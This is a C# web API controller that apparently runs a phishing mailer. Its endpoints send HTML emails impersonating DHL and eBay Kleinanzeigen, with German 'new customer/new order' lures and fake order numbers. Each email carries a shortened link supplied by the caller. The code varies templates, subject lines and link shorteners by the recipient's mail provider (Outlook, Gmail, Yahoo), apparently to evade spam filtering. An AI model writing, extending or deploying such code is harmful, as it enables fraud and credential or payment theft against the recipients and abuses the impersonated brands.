using System.Net;
using System.Net.Mail;
using DteCrm.Services.EmailService;
using Microsoft.AspNetCore.Mvc;
using NoWayMailerAPI.Data;
using NoWayMailerAPI.Services.Interfaces;
using FileIO = System.IO.File;

namespace MailerRobot.Controllers;

[ApiController]
[Route("/api/[controller]")]
public class SenderController : ControllerBase
{
	private readonly IConfiguration _configuration;
	private readonly IShortLinkService _shortLinkService;
	private readonly SmtpClient _smtpClient;
	private readonly string _senderEmail;
	private readonly int _orderNumber;

	public SenderController(IConfiguration configuration, IShortLinkService shortLinkService)
	{
		_configuration = configuration;
		_shortLinkService = shortLinkService;
		_orderNumber = Random.Shared.Next(234422000, 534522847);

		var config = new EmailSendingConfiguration();

		_configuration.GetSection("MailSettings")
					.GetChildren()
					.First(e => e.Key == "SmtpBackup")
					.Bind(config);

		_smtpClient = new SmtpClient(config.Host, config.Port)
		{
			Credentials = new NetworkCredential(config.User, config.Password),
			EnableSsl = true
		};

		_senderEmail = config.Alias;
	}

	[HttpGet("dhl")]
	public async Task<IActionResult> SendDHLEmail(string email, string link)
	{
		var body = await GetBody(link, ServiceType.DHL, email);

		var message = new MailMessage(_senderEmail, email,
			$"Unser Team hat einen Kunden für Sie gefunden #{_orderNumber}", body)
		{
			IsBodyHtml = true,
			From = new MailAddress(_senderEmail, $"• Neue Bestellung #{_orderNumber}")
		};

		try
		{
			await _smtpClient.SendMailAsync(message);

			return Ok();
		}
		catch (Exception e)
		{
			return BadRequest(e.Message);
		}
	}

	[HttpGet("ebay")]
	public async Task<IActionResult> SendEbayEmail(string email, string link)
	{
		var body = await GetBody(link, ServiceType.EbayDe, email);
		
		var displayName = "•KLEINANZEIGEN•Info";

		var subject = "Neuer Kunde! Vielen Dank, dass Sie sich für uns entschieden haben.#312887";
		//var subject = "Guten abend! Vielen Dank, dass Sie sich für uns entschieden haben.#312887";

		if (email.Contains("hotmail") || email.Contains("outlook"))
			subject = $"Nutzer-Anfrage zu deiner Anzeige!#{_orderNumber}";

		var message = new MailMessage(_senderEmail, email, subject, body)
		{
			IsBodyHtml = true,
			From = new MailAddress(_senderEmail, displayName)
		};

		var result = new Dictionary<string, string>();
		
		try
		{
			await _smtpClient.SendMailAsync(message);

			result.Add("result", "success");
			return Ok(result.FirstOrDefault());
		}
		catch (Exception e)
		{
			result.Add("result", "failed");
			return BadRequest(result.FirstOrDefault());
		}
	}

	private async Task<string> GetBody(string link, ServiceType serviceType,
		string email)
	{
		var template = EbayTemplate.Custom;

		var listEmails = new List<string>
		{
			"hotmail", "outlook", "live"
		};
		
		if (listEmails.Any(email.Contains) && serviceType == ServiceType.EbayDe)
			template = EbayTemplate.Original;

		var type = ShrtCoLink.UseShrtCo;
		
		var listEmails2 = new List<string>
		{
			"gmail", "googlemail"
		};
		
		if (listEmails2.Any(email.Contains) && serviceType == ServiceType.EbayDe)
			type = ShrtCoLink.Use9Nr;

		if (email.Contains("yahoo"))
			type = ShrtCoLink.Use9Nr;
		
		var shortLink = await _shortLinkService.GetShortLink(link, type, template);

		var templateName = template == EbayTemplate.Custom ? $"{serviceType}.html" : "EbayOriginal.html";
		
		var filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Templates", templateName);

		var hmtlBody = FileIO.ReadAllText(filePath)
							.Replace("PutYourLinkHere", shortLink);

		return hmtlBody
				.Replace("OrderNumber", _orderNumber.ToString());
	}
}